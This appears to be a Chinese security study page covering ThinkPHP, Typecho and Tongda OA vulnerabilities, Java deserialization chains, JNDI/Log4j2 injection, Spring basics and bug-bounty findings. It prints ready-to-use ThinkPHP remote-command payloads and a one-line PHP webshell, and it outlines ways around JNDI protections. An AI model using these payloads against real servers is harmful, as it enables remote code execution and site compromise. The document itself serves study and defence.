<h3 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h3><h4 id="框架特征-1"><a href="#框架特征-1" class="headerlink" title="框架特征"></a>框架特征</h4><h4 id="漏洞版本-1"><a href="#漏洞版本-1" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p><strong>5.0 method任意调用方法导致RCE</strong><br>payload1：<code>?s=captcha _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code><br>POST传入<code>_methond</code>参数为<code>__construct</code>，那么在程序运行中他就会调用<code>__construct</code>方法；<br>在<code>__construct</code>方法中，传入数组即可对Request对象的成员属性进行覆盖，那么就可以给<code>filter[]</code>system等危险函数；<br>我们请求的路由是<code>captcha</code>，按照对应的路由规则，需要让<code>methond</code>参数为get；<br>在<code>param()</code>方法中将当前请求参数和url地址中的参数合并了，给get传whoami等恶意命令，这里get也需要是一个数组；<br>然后在<code>input</code>方法中，使用<code>array_walk_recursive</code>对<code>$data</code>参数也就是我们传入的get数组中的每一个值调用<code>filterValue()</code>方法，在该方法中使用了<code>call_user_func</code>，其中的两个参数就是我们传入的system和whoami。</p>
<p>简略：<br>可以通过POST传入<code>_methond</code>参数值为<code>__construct</code>，然后在程序运行中就会调用<code>__construct</code>方法，可以通过传入数组对其中的成员属性进行覆盖，这里就可以传入system等命令执行函数；<br>然后根据路由规则，需要给一个参数赋值为get，而get需要是一个数组，值又是可控的，所以可以传入需要执行的命令；<br>最后在某个方法中，对我们传入的两个数组进行调用，将数组的内容作为参数传给<code>call_user_func</code>，从而造成RCE。</p>
<p>payload2:<br><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code><br>第二种方法不同的就是进入的if分支不同，进入<code>methond()</code>方法后，调用了<code>server()</code>，可以给<code>server的REQUEST_METHOD</code>传值为whoami，最后直接调用<code>filterValue()</code>方法执行命令。</p>
<p><strong>5.0.x 缓存RCE</strong><br>payload：<code>?name=echod&quot;%0Aeval($_GET[1]);//</code>（一句话木马）<br>在<code>\think\cache\driver\File.php</code>的<code>set()</code>方法中，将name进行md5加密再分解，将前两个字符作为文件目录，剩下的作为文件名；<br>然后将传入的内容进行序列化，再拼接上php标签；<code>%0A</code>是换行符，末尾的<code>//</code>可以注释掉后面拼接的符号；<br>最后使用<code>file_put_contents</code>将拼接后的内容写入前面生成的文件中；所以我们知道了文件保存路径，就可以访问该文件，执行命令。</p>
<p><strong>5.0.x 5.1.x 未开启强制路由导致RCE</strong><br>payload：<code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code><br>ThinkPHP默认情况下没有开启强制路由，默认开启的是兼容模式；（路由知识）<br>所以程序会进入<code>parseUrl</code>方法，将传入的控制器等信息分别存在变量中；<br>然后又在<code>bindParams</code>方法中将传入的危险参数值分别存入<code>$args</code>变量中，最后通过反射调用我们传入的<code>invokefunction</code>方法，利用传入<code>call_user_func</code>执行命令。</p>
<h3 id="Typecho反序列化漏洞"><a href="#Typecho反序列化漏洞" class="headerlink" title="Typecho反序列化漏洞"></a>Typecho反序列化漏洞</h3><p>影响版本：2017年10月24日之前的所有版本<br>漏洞简介：<code>install.php</code>存在反序列化漏洞可执行任意命令实现前台getshell<br>程序运行需要满足两个条件：</p>
<ul>
<li>$_GET[‘finish’]参数不能为空</li>
<li>Referer必须是本站</li>
</ul>
<p>install.php中的<code>_typecho_config</code>参数可以通过<code>$_COOKIE</code>传入，也可以通过<code>$_POST</code>传入，传入后对这个参数进行了base64解码和反序列化操作，反序列化后的值存入<code>$config</code>变量；<br>然后以<code>$config</code>中的属性作为参数实例化<code>Typecho_Db</code>类，在实例化的过程中会对<code>$adaterName</code>参数进行字符串拼接，根据PHP模式方法的规则，如果给<code>$adaterName</code>参数赋为一个类，那么就会触发<code>_toString()</code>方法；<br>到<code>Feed.php</code>中，访问了<code>$item[&#39;author&#39;]</code>参数的<code>screenName</code>属性，该参数可控，那么给它赋一个没有该属性的类<code>（Typecho_Request）</code>，就会触发<code>_get()</code>方法；<br>在get()方法中调用了<code>_applyFilter()</code>方法，该方法中使用了<code>array_map</code>和<code>call_user_func</code>方法，根据前面的限定规则，这里触发的是<code>call_user_func</code>方法，其中两个参数都可控；<br>编写POC，进行序列化和base64编码后再传入。</p>
<h3 id="通达OA"><a href="#通达OA" class="headerlink" title="通达OA"></a>通达OA</h3><p><strong>未授权文件上传</strong><br>影响版本：<br>V11.3版<br>2017版<br>2016版<br>2015版<br>2013版<br>2013增强版</p>
<p>在<code>upload.php</code>中，只要POST传入一个P值，就可以绕过是否登录的验证，后续再根据<code>DEST_UID</code>和<code>UPLOAD_MODE</code>的值来判断ID是否有效，所以只需要合理控制这三个参数，就可以绕过登录验证来上传文件。<br><strong>任意文件包含导致RCE</strong><br>在<code>/ispirit/interface/gateway.php</code>中，对GET传入的<code>$json</code>参数进行循环解析，只要$json参数的键名等于url，并且值中含有<code>general/</code>或<code>ispirit/</code>或<code>module/</code>时，就可以对传入的url进行包含；<br>所以就可以结合文件上传进行RCE。</p>
<p><strong>任意文件删除</strong><br>影响版本：通达OA V11.6</p>
<p>在<code>/module/appbuilder/assets/print.php</code>中，只判断了GET传入的文件名是否存在，存在即可删除。<br><strong>未授权访问任意文件上传导致RCE</strong><br>因为前面可以任意删除文件，所以就可以把验证权限的文件删除掉，从而实现未授权访问上传的恶意文件，导致RCE。</p>
<h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><p>Java反射就是把类中的各个组成部分封装成为Java对象，可以在程序运行过程中更方便获取和操作这些对象。</p>
<h2 id="Java-RMI"><a href="#Java-RMI" class="headerlink" title="Java RMI"></a>Java RMI</h2><p>RMI就是<strong>远程方法调用</strong>，就比如客户端可以调用服务端提供的远程对象中的方法；<br>由三部分组成：</p>
<ul>
<li>RMI Registry：JDK提供的一个可独立运行的程序（bin目录下）；</li>
<li>RMI Server：服务端程序，对外提供远程对象，代码在这里执行，将执行结果返回给客户端；</li>
<li>RMI Client：客户端程序，想要调用远程对象的方法。</li>
</ul>
<p>可被远程调用的接口必须要继承<code>java.rmi.Remote</code>接口，其中定义的方法要抛出<code>java.rmi.RemoteException</code>异常，只有远程接口中指定的方法是远程可调用的；<br>远程接口的实现类要继承<code>java.rmi.server.UnicastRemoteObject</code>（这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端）；<br>该类必须定义一个显式构造函数，并且抛出<code>java.rmi.RemoteException</code>异常；</p>
<p><strong>服务端将远程对象注册到<code>RMI Registry</code>后，客户端就能请求这个远程对象；<br>客户端通过访问远程对象绑定的端口和名称就可以调用该对象的方法。</strong></p>
<p>服务端将远程对象注册到RMI 注册表中后，会生成对应的Stub，Stub相当于是远程对象的引用或者说是远程对象的一个代理；<br>客户端向注册中心查询远程对象名称，会获得相应的Stub，客户端就通过这个Stub来调用远程方法；</p>
<h3 id="RMI反序列化利用："><a href="#RMI反序列化利用：" class="headerlink" title="RMI反序列化利用："></a>RMI反序列化利用：</h3><p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204740">https://www.anquanke.com/post/id/204740</a></p>
<p><strong>1. 攻击服务端：</strong><br>   在客户端获取到服务端创建的Stub后，会在本地调用这个Stub并传递参数，Stub会将参数序列化再传给服务端，服务端在接收到参数后会将参数反序列化并调用；<br>   如果服务端存在反序列化利用链，并且传入的参数是一个恶意的Object类型，那么就可能收到反序列化攻击。</p>
<p><strong>动态类加载：</strong> 当本地ClassPath中无法找到相应的类时，会在指定的codebase里加载class。（这个特型在6u45&#x2F;7u21之前都是默认开启的）</p>
<p>   Client端可以通过配置<code> java.rmi.server.codebase</code>属性，向Server端传递不存在的类，那么Server端就会从<code>codebase</code>地址中远程加载恶意类，从而触发攻击。</p>
<p>（使用RMI进行攻击需要两个条件，一个是接收Object类型的参数，第二个是RMI的服务端存在反序列化RCE利用链；）</p>
<p>在远程接口中定义一个接受object类型参数的方法，在实现类中实现这个方法，在客户端中调用这个方法，Object参数的内容是对应利用链的poc；<br>由于RMI在传输数据的时候会将数据序列化，传输完成后再反序列化，所以当POC反序列化时就会触发我们构造的代码。</p>
<p><strong>2.攻击Registry端</strong><br>   Server端向Registry端绑定的服务对象时Server端生成的动态代理类，Registry端会反序列化这个类并存在自己的RegistryImpl类的bindings中，供以后查询；<br>   如果Server端向Registry端发送了一个恶意的对象，那么Registry端就可能受到反序列化攻击。<br>   （bind的参数是Remote类型的，所以可以使用AnnotationInvocationHandler 动态代理 Remote 接口，将参数类型转换成Remote）</p>
<p>   Client端向Registry端查询(远程对象)的时候也是将查询的名称进行序列化传输，Registry接收到请求后会将其反序列化，所以如果Client端如果传输的是一个恶意类，那么Registry端也可能受到攻击。</p>
<p><strong>3. 攻击Client端</strong><br>由于Client端会从Registry端获取Server端注册的对象并反序列化，还会从服务端获取返回的结果并反序列，所以Client同样可能受到Server端和Registry端的攻击。</p>
<h2 id="Java序列化和反序列化"><a href="#Java序列化和反序列化" class="headerlink" title="Java序列化和反序列化"></a>Java序列化和反序列化</h2><p>Java 序列化：把Java对象转换为字节序列的过程（存放到硬盘中）；<br>Java 反序列化：把字节序列还原为Java对象的过程（存放到内存中）；</p>
<p>Java类需要实现<code>java.io.Serializable</code>接口，才能进行序列化和反序列化操作；(父类实现了，其子类不用在实现)（通过Serializable接口对对象序列化的支持是内建于核心 API 的）<br>与<code>Externalizable</code>接口的区别在于，<code>Externalizable</code>的所有实现类必须提供读取和写出的实现，也就是实现它的两个方法(<code>writeExternal()``readExternal()</code>)才能使对象的状态持续下来，否则在反序列化的时候对象的所有参数值都会恢复成为默认值；</p>
<p><code>ObjectOutputStream</code>类：序列化流，将对象序列化输出到文件中保存（<code>writeObject</code>）；<br><code>ObjectInputStream</code>类：反序列化流，将序列化数据恢复成对象(<code>readObject</code>)；</p>
<p><code>transient</code>声明的变量不被序列化到文件中，反序列化时，int恢复为0，对象型恢复为null；</p>
<p><strong>静态变量：</strong><br>静态变量是属于类的状态，而序列化只保存对象的状态，所以序列化时并不保存静态变量，因此在反序列化前改变静态变量，反序列化后静态变量的结果会一起改变；</p>
<p><strong>serialVersionUID：</strong><br>即序列化版本号，是Java程序运行时环境根据类的内部细节自动生成的；<br>该序列号在反序列化过程中用于验证序列化对象的发送者和接收者是否为该对象加载了与序列化兼容的类。如果接收者加载的该对象的类的 serialVersionUID 与对应的发送者的类的版本号不同，则反序列化将会导致 InvalidClassExceptio。<br>如果对类的源代码进行了修改，再重新编译，新生成的类文件的serialVersionUID的取值有可能也会发生变化；<br>建议显式定义serialVersionUID。</p>
<h2 id="Java-JNDI"><a href="#Java-JNDI" class="headerlink" title="Java JNDI"></a>Java JNDI</h2><p><strong>一、概述</strong><br>  JNDI全称是<strong>Java命名和目录接口</strong>，是Java中为命名和目录服务提供接口的API（查询远程对象。）<br>  Naming是指将对象通过唯一标识符(取个名字)绑定到一个容器环境Context中，以后又可以使用lookup方法从环境容器中根据这个唯一标识符找到所绑定的Java对象。<br>  Context本身也是一个Java对象，它可以通过一个名称绑定到另一个容器中；<br>  目录是指将一个对象的所有属性信息保存到一个容器环境中，提供对属性的操作；</p>
<p><strong>过程</strong><br>（服务端-攻击者，客户端-被攻击者）<br>   服务端将Reference对象绑定到指定端口和名称下，这个对象中构造了对远程对象的引用和factory类名及位置；客户端使用lookup方法获取到Reference对象后，会获取对象中的Factory类，通过Factory类将Reference对象转为具体的示例；当本地找不到Factory类时，会从指定的地址去加载。如果lookup的的参数可控，那么就可以指定加载远程恶意类，从而造成RCE。</p>
<p>服务端使用RefereneWrapper封装了一个Reference对象，这个对象中构造了对远程对象的引用和factory类名及位置，然后将封装后的对象绑定到一个名称上；<br>客户端要先创建一个Context对象，然后使用lookup进行查询；客户端会得到一个从<code>ReferenceWrapper_Stub</code>返回的<code>Reference</code>对象，然后从中获取Factory类，先尝试从本地加载，加载不到就使用指定的url进行远程加载。</p>
<p><strong>造成JNDI注入的原因</strong>是查询的远程对象可控（lookup(url)中的URL可控，），通过构造恶意远程对象，对目标服务发起攻击。</p>
<p><strong>区分 RMI 和 JNDI：</strong><br>RMI 是绑定了远程对象后，通过 lookup 查找对象，再调用它的方法；</p>
<p>JNDI 是除了使用 RMI 绑定的远程对象外，还可以通过 References 类来绑定一个 外部的远程对象，不在当前目录系统中（没有在注册中心里），这个远程对象可以是我们构造恶意对象，当通过 lookup 来查找这个远程对象时，会动态加载并实例化从 References 对象中获得的 Factory 类，从而执行其中的恶意代码。（不需要调用它的方法）</p>
<p><strong>RMI、JNDI高版本限制：</strong></p>
<ol>
<li><p>RMI<br> 当客户端加载远程对象的时候，会先从本地 classpath 中去寻找，如果找不到，则向指定的 codebase 去获取，必须要求 RMI 的上下文环境允许访问远程 codebase，	并且<code>java.rmi.server.useCodebaseOnly</code>的值为 false；<br> 从JDK 6u45、7u21开始，<code>java.rmi.server.useCodebaseOnly</code>的值默认设置为true，就不能从 codebase 加载远程类，只能加载本地 classpath 里的类。</p>
</li>
<li><p>RMI + JNDI<br> 当客户端从返回的 References 对象中获取到 Factory 类后，也会先从本地 classpath 中去寻找找不到再从远程 codebase 加载，但是并不受前面<code>useCodebaseOnly</code>属性的影响；<br> 而是受<code>com.sun.jndi.rmi.object.trustURLCodebase</code>和		<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>的影响，当这两个属性为 true 时，允许从远程 codebase 加载，为 false 则不允许；<br> 从 JDK 6u132、7u122、8u121开始，这两个属性默认为 false ，不允许从远程 Codebase 加载。</p>
</li>
<li><p>LDAP + JNDI<br> LDAP 服务也是先从本地 classpath 加载，找不到就从远程 codebase加载；<br> 但是不受前面的属性影响，而是受 ldap 中的<code>trustURLCodebase</code>属性影响，值为 true 时允许加载，为 false则不允许；（<code>com.sun.jndi.ldap.object.trustURLCodebase</code>）<br> 从 JDK 6u211、7u201、8u191、11.0.1之后，该属性值默认设为 false。</p>
</li>
</ol>
<p><strong>绕过高版本限制：</strong></p>
<ol>
<li>从受害者本地的 classpath 中找一个可利用的类来执行恶意命令（能由攻击者传入恶意参数）；</li>
<li>如果受害者主机存在反序列化利用链，就可以通过 LDAP 直接返回一个恶意的序列化对象，当受害者端对其进行反序列化的时候，就能成功执行命令。</li>
</ol>
<h2 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h2><p><strong>一、静态代理</strong><br>在程序运行前就已经存在代理类的字节码文件，代理类与被代理类的关系在运行前就确定了。<br>代理类和被代理类要实现同一个接口，只能调用接口中定义的抽象方法；</p>
<p>缺点：<br>1.由于代理类需实现与目标对象相同的接口，当有多个需被代理的类时，只有两种方法：</p>
<ul>
<li>只创建一个代理类，这个代理类同时实现多个接口及其抽象方法，但是会导致代理类过于庞大；</li>
<li>创建多个代理类，每个代理类对应一个被代理类，但是会长生过多代理类；<br>2.当接口需要增加、删除、修改方法时，被代理类和代理类的代码都要修改，代码量过大，不易维护。</li>
</ul>
<p><strong>二、动态代理</strong><br>动态代理的代理类是在程序运行期间由JVM根据反射等机制动态生成的，程序运行前并不存在代理类的字节码文件。</p>
<p>实现步骤：<br>动态代理通过实现<code>InvocationHandler</code>接口创建自己的调用处理器；<br>使用Proxy 类的<code>newProxyInstance </code>方法来生成动态代理实例，针对不同的被代理类，传入相应的处理器；（指定<code>ClassLoader</code>对象和一组<code>interface</code>）<br>在处理器中会利用invoke方法获得动态代理对象的方法和参数并执行。</p>
<h2 id="Java-URLDNS"><a href="#Java-URLDNS" class="headerlink" title="Java URLDNS"></a>Java URLDNS</h2><p><code>java.util.HashMap</code>重写了<code>readObject</code>方法，在反序列化时会调用hash函数计算key的<code>hashCode</code>，而<code>java.net.URL</code>的hashCode在计算时会调用<code>getHostAddress</code>来解析域名，从而发出DNS请求.</p>
<p>利用链：<br>    HashMap-&gt;readObject()<br>    HashMap-&gt;hash()<br>    URL-&gt;hashCode()<br>    URLStreamHandler-&gt;hashCode()<br>    URLStreamHandler-&gt;getHostAddress()<br>    InetAddress-&gt;getByName()</p>
<h2 id="Java-Commons-Collections-1"><a href="#Java-Commons-Collections-1" class="headerlink" title="Java Commons Collections 1"></a>Java Commons Collections 1</h2><p><strong>TransformedMap</strong><br>在<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法中调用了<code>setValue()</code>方法，在调用<code>setValue()</code>方法时会自动调用<code>checkSetValue()</code>方法从而触发<code>transform()</code>方法对我们构造的数组进行回调，从而执行命令。</p>
<p>反射获取<code>RunTime()</code>对象，创建一个Transformer类型的数组；<br>使用<code>ChainedTransformer</code>对数组进行回调，那么就要调用到<code>transform()</code>方法；<br>使用<code>TransformedMap</code>对Map对象进行修饰，在<code>setValue</code>方法下调用了<code>checkSetValue()</code>方法，该方法使用了<code>transform()</code>方法对数组进行回调；<br>反射获取<code>AnnotationInvocationHandler</code>类对象，在它的<code>readObject()</code>方法中，只要满足两个条件，就会调用<code>setValue</code>方法，从而执行命令。<br>（第一个参数必须是Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设方法名为X；<br>被TransformedMap.decorate修饰的Map中必须有⼀个键名为X的元素）</p>
<p>这条链只适用于8u71以前的版本，以后的版本由于<code>AnnotationInvocationHandler</code>发⽣了变化导致不再可⽤.</p>
<p><strong>LazyMap</strong><br>这条链的区别在于调用<code>transform()</code>方法的位置不同；<br>在LazyMap的<code>get()</code>方法中，当传入的参数不在map中时，就会进入if分支执行<code>factory.transform()</code>，factory是可控的，传入Transformer数组，就可以对数组进行回调，从而执行命令；<br>要调用到<code>get()</code>方法，就要利用到动态代理的知识；<br>在调用被代理对象的任意方法时，会触发被代理类的<code>invoke</code>方法，而在<code>AnnotationInvocationHandler</code>类的invoke方法中刚好调用了get()方法；<br>所以通过反射获取<code>AnnotationInvocationHandler</code>类对象，为其创建一个代理对象。</p>
<h2 id="Java-Commons-Collections-2"><a href="#Java-Commons-Collections-2" class="headerlink" title="Java Commons Collections 2"></a>Java Commons Collections 2</h2><p>并且使用的是commons-collections-4.0版本，该版本删除了lazyMap的decode方法，所以CC1不用4.0版本；<br>而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本。</p>
<p>CC2也包含了两条利用链</p>
<p>这条链的关键点在于<code>TransformingComparator</code>类中实现了<code>compare()</code>方法，<code>compare()</code>方法里调用了<code>transform()</code>；<br>首先创建一个<code>PriorityQueue</code>对象，先让它的<code>comparator</code>变量为null；<br>然后要满足队列中元素个数大于一个，再通过反射获取<code>PriorityQueue</code>对象的<code>comparator</code>变量，将它赋值为<code>TransformingComparator</code>类的实例化对象，这样才既能生成反序列化文件，又能执行命令。</p>
<h4 id="Javassit"><a href="#Javassit" class="headerlink" title="Javassit"></a>Javassit</h4><p>javassit可以直接编辑和生成字节码文件；<br>Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。</p>
<p>使用javassit生成一个含有恶意命令的类，将生成的字节码传入到<code>TemplatesImpl</code>类的对象中，再将对象传入<code>PriorityQueue</code>类对象的<code>queue</code>变量里；<br>这里仍然一设置队列长度大于1；<br>然后再通过反射获取<code>PriorityQueue</code>对象的<code>comparator</code>变量，将它赋值为<code>TransformingComparator</code>类的实例化对象；<br>当进入到<code>compare()</code>方法时，其中的<code>transformer</code>参数可控，可以设置为<code>InvokerTransformer</code>，所以就是调用<code>InvokerTransformer.transform()</code>，在这个<code>transform()</code>中，我们把<code>this.iMethodName</code>的值为设为了的newTransformer；<br>这个方法继续跟下去，到最后，通过<code>loader.defineClass</code>将我们传入的含有恶意代码的字节数组还原为Class对象，然后再实例化这个对象，那么就执行其中含有的恶意代码。</p>
<h2 id="Commons-Collections-3"><a href="#Commons-Collections-3" class="headerlink" title="Commons Collections 3"></a>Commons Collections 3</h2><p>CC3可以说是CC1H和CC2的结合版；<br>和CC1一样，通过动态代理触发<code>AnnotationInvocationHandler</code>的invoke方法，从而触发LazyMap的get方法，进而触发<code>transform()</code>方法；<br>触发了<code>transform()</code>方法就会对我们传入的数组进行回调，构造数组内容。将<code>TrAXFilter</code>类返回给<code>InstantiateTransformer</code>，在这个类中会实例化<code>TrAXFilter</code>类，所以会调用到它的构造方法，在它的构造方法中调用到了<code>newTransformer()方法</code>，将<code>newTransformer()</code>方法的参数设为javassit生成的恶意的字节码文件，就和CC2一样，最后将字节码文件还原为Class对象，再实例化这个对象，从而执行里面的恶意代码。</p>
<h2 id="Commons-Collections-4"><a href="#Commons-Collections-4" class="headerlink" title="Commons Collections 4"></a>Commons Collections 4</h2><p>CC4和CC2一样通过调用<code>TransformingComparator.compare()</code>来实现<code>transform()</code>方法的调用；<br>然后和CC3一样，通过实例化TrAXFilter类，然后调用它的构造方法，进而实现newTransformer()的调用，最后实例化javassit生成的恶意对象来执行恶意代码；</p>
<h2 id="Commons-Collections-5"><a href="#Commons-Collections-5" class="headerlink" title="Commons Collections 5"></a>Commons Collections 5</h2><p>CC5是通过<code>BadAttributeValueExpException.readObject()</code>触发<code>TiedMapEntry.toString()</code>，然后调用<code>getValue()</code>，接着调用到<code>map.get()</code>方法，map可以设为LazyMap，所以就是调用了<code>LazyMap.get()</code>，和前面一样，继续触发<code>transform()</code>，对构造的命令执行的数组进行回调，从而执行命令。</p>
<h2 id="Commons-Collections-6"><a href="#Commons-Collections-6" class="headerlink" title="Commons Collections 6"></a>Commons Collections 6</h2><p>CC6是通过<code>HashSet#readObject</code>中的<code>map.put()</code>，逐步跟到<code>TiedMapEntry#hashCode</code>，<code>hashCode()</code>方法中调用了<code>getValue()</code>，和CC5一样，进而调用到<code>map.get()</code>。</p>
<h2 id="Commons-Collections-7"><a href="#Commons-Collections-7" class="headerlink" title="Commons Collections 7"></a>Commons Collections 7</h2><p>CC7是在<code>Hashtable#readObject</code>，根据传入元素的个数循环调用<code>reconstitutionPut</code>，在这个方法中，会在for循环里调用<code>e.key.equals()</code>，当传入两个元素时，就会进入这个for循环，还得保证传入的两个key值的hash值要相等（zZ，yY）;<br>进入for循环后，就接着<code>AbstractMap#equals</code>方法中调用了<code>m.get()</code>，m可控，就可以传入LazyMap类对象，从而调用到<code>LazyMap.get()</code>。</p>
<h2 id="Log4j2-JNDI-注入漏洞分析（CVE-2021-44228）"><a href="#Log4j2-JNDI-注入漏洞分析（CVE-2021-44228）" class="headerlink" title="Log4j2 JNDI 注入漏洞分析（CVE-2021-44228）"></a>Log4j2 JNDI 注入漏洞分析（CVE-2021-44228）</h2><p>主要原因就是在答应日志的过程中，会识别<code>$&#123;&#125;</code>，并且按第一个分号将我们传入的字符串拆分开，判断分号前的部分是什么，比如我们传入 JDNI 表达式的话，分号前面就是 jndi，就允许通过 JDNI 来检索分号后面的命名对象，从而实现远程类的加载。</p>
<p>代码上的关键点就在于<code>toSerializable()</code>方法中，循环调用了<code>formatters</code>数组中的每个对象的 format 方法，而在其中一个对象的 format 方法下，就是对传入的 message 进行拆分并解析，最后调用到 looup 加载远程的恶意类。</p>
<h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p>Spring是一种基于 Bean 的编程技术。<br><strong>特点：</strong> 降低耦合度，简化开发，方便集成其他框架。</p>
<p>两个核是 IoC 和 AOP；</p>
<h3 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h3><p>译为控制反转，平常我们是先 new 一个对象，再调用它的方法；Spring则是把创建对象的过程交给 IoC 容器来实现，我们直接调用它的方法就行了。</p>
<p>Spring 提供 BeanFactory 和 ApplicationContext两种类型的 IoC 容器；<br><em><strong>BeanFactory</strong></em> 采用懒加载（lazy-load）机制，容器在加载配置文件时并不会立刻创建 Java 对象，只有程序中获取（使用）这个对象时才会创建。（通常不提供给开发者使用）<br><em><strong>ApplicationContext</strong></em> 是 BeanFactory 接口的子接口，对 BeanFactory 进行了扩展。（加载配置文件，创建和初始化所有对象，然后 getBean()）；常用实现类：</p>
<ul>
<li>ClassPathXmlApplicationContext，加载类路径 ClassPath 下指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作；</li>
<li>FileSystemXmlApplicationContext，加载指定的文件系统路径中指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作。</li>
</ul>
<p>对象之间的依赖关系都是在配置文件中定义的，修改时只用该配置文件就好了，不用修改Java 代码；<br>（底层实现为解析 xml 文件 和反射创建对象。）</p>
<p><strong>Bean</strong> 就是由Spring IoC 容器管理的对象，在配置文件中定义 ，<code>&lt;bean&gt;</code>标签 id 指定bean 的名称，class 指定类，<code>&lt;property&gt;</code>标签可以给属性赋值；（ref 指向引用类型）<br>Bean 继承时对象层面的继承，会继承父 Bean 的属性值。</p>
<p><strong>scope</strong>作用域：单例模式，原型模式，request，session，application，websocket；</p>
<p><strong>依赖</strong> 通过 <code>depends-on=&quot;&quot;</code>确定依赖关系，被依赖的 Bean 先创建；</p>
<p><strong>Bean属性注入：</strong> 使用<code>&lt;property&gt;</code>和<code>&lt;constructor-arg&gt;</code>对属性进行赋值；DI注入也是其中的一种；分别可以用<code>p 命名空间</code>和<code>c 命名空间</code>来表示。</p>
<p><strong>自动装配</strong>：让Spring 根据配置文件中自动装配的规则寻找到在一个 Bean 中所注入的另一个 Bean，就不用使用 ref 属性来关联了；autowire 属性，五种规则：byName，byType，constructor，default，no</p>
<h3 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h3><p>面向切面编程，就是说当多个业务方法都要实现一段相同的代码时，可以把这部分代码取出封装起来，抽象成一个切面，在程序运行时，将封装的代码切入到指定方法的指定位置上，这样可以减少重复的代码。</p>
<p><strong>优点：</strong> 降低耦合度，使程序功能更容易扩展，更好的代码复用。<br><strong>实现：</strong> 将所有重复的代码写在切面类中，Spring 会自动根据切面类生成一个代理对象，当调用它的方法的时候就会在需要的时候到切面类中执行相应的方法；<br><strong>注解：</strong> @Aspect、@Component、@Befor、@After、@AfterReturning、@AfterThrowing<br>自动扫描：<code>context:component-scan</code><br>使 @Aspect 生效：<code>&lt;aop:aspectj-autoproxy&gt;</code><br><strong>依赖注入DI</strong>就是对象与对象之间存在依赖关系，例如一个类中的属性，是另一个类的对象。</p>
<h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><p>Model-View-Controller(模型-视图-控制器)；<br>Model 用于处理业务逻辑、访问数据库等；View 用于与浏览器交互，展示数据；Controller 负责将用户的求交给相应的 Model	进行处理，然后将处理完的数据交给相应的 View 进行渲染展示给用户。<br><strong>优点：</strong> 降低耦合度，有利于分工合作。<br><strong>核心：</strong> 是<code>DispatcherServlet</code>，它是 Spring MVC 的前端控制器，主要负责对请求和响应的统一地处理和分发。</p>
<p>MVC 工作流程：<br><img src="/./images/1660123953790.png" alt="enter description here"></p>
<p><strong>注解：</strong></p>
<ul>
<li><strong>@Controller</strong>该注解可以将一个普通的Java类标识成控制器(Controller)类。</li>
<li><strong>@RequestMapping</strong>该注解通常被标注在控制器的方法上，负责将请求与处理请求的控制器方法关联起来，建立映射关系。</li>
</ul>
<h2 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h2><ol>
<li><p>（高危）发现一个因为缺少对用户身份的二次验证，导致可以任意修改用户的手机号；<br>用户是通过 手机号+验证码 登录的，有一个修改用户信息的地方，显示只能修改用户名和所在单位等信息，通过抓包观察，在修改信息的返回包中会返回用户的所有信息，包括用户id，手机号，名称单位什么的；我把手机号字段添加到请求包中，修改为另一个手机号发送，在返回包中就可以看到返回的是我修改后的手机号，这期间没有对我的操作进行任何验证；然后重新用修改后的手机号登录，显示的就是之前这个用户的所有信息；而原来那个手机号就成了未注册的手机号，登录会要求重新填写用户信息。<br>如果攻击者通过某种手段登录到了用户的账号，就可以随意更改手机号，给用户造成很大的损失。</p>
</li>
<li><p>(高危) 是一个电商平台，可以注册商家，有上传头像的功能，抓上传头像的包，可以看到请求里有一个图片地址的字段，把这个字段的值改为1，发送；页面显示拒绝服务，无论怎么刷新都拒绝服务，重新登录也是拒绝服务；<br>  并且还存在 CSRF ，构造上传头像为 1 的 POC，让其他商家点击，那么他们的也会被拒绝服务，无法再对账号进行操作，造成损失。</p>
</li>
<li><p>（中低危）抓包修改用户id，实现越权访问；<br> 抓包重复 repeater，因为只验证了cookie存在情况，没有验证空cookie，就可以实现无限点赞；</p>
</li>
</ol>
<h2 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h2><h4 id="主动扫描，被动扫描"><a href="#主动扫描，被动扫描" class="headerlink" title="主动扫描，被动扫描"></a>主动扫描，被动扫描</h4><p>主动扫描：输入URL，然后由扫描器中的爬虫模块爬取所有连接<br>被动扫描：通过代理将流量转发给漏洞扫描器，不使用爬虫进行大规模的爬取。主动扫描，被动扫描</p>
<h3 id="portscanner"><a href="#portscanner" class="headerlink" title="portscanner"></a>portscanner</h3><p>   接收三个参数，<code>-a</code>参数是扫描目标的地址，可以是域名，也可以是IP；<code>-p</code>参数是要扫描的端口号，可以是单个指定端口，也可以是多个指定端口，或者是指定端口范围，默认是扫描1-1024端口（和一些1024以上的常见端口号）；<code>-t</code>参数就是设置进程数，默认为30；<code>-T</code>参数就是选择是进行TCP扫描，<code>-S</code>是选择进行SYN扫描。</p>
